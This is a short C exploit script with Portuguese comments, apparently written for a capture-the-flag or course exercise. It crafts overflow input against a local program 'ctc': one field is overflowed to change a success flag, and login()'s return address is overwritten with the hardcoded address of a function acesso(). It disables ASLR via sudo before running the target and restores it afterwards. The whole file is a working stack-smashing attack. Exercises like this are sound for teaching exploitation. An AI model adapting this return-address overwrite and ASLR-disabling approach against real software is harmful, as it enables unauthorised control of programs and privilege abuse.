#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STR_SIZE 97 //Defina o tamanho do seu buffer aqui

int main(void) {

  FILE *f = fopen("./teste.in", "w+");
  char str[STR_SIZE+1];
  //Você deve preparar a string de entrada (STDIN) aqui!

  // Passando o binario do endereço de acesso() para uma string*/
  unsigned long int temp = 93824992235945;
  char acesso_adress[sizeof(long int)+1];
  memcpy(acesso_adress,&temp,sizeof(long int));
  acesso_adress[sizeof(long int)] = '\0';

  //Primeiro acesso
  //Overflow em PASS, modifica STD_SUCCESS
  strcpy(str,"SB\nMUITOSEGURO\n");
  strcat(str,"------------------------A BANDEIRA É MINHA!\n");

  //Segundo acesso
  //Overflow em, P_USER, modifica endereço de retorno de login() para acesso()
  strcat(str,"---------------");
  strcat(str,"--------"); 
  strcat(str,"--------");
  strcat(str,acesso_adress);


  fwrite(str, 1, STR_SIZE, f);  
  fclose(f);

  system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
  system("./ctc < teste.in");
  system("sudo echo 2 > /proc/sys/kernel/randomize_va_space");
}
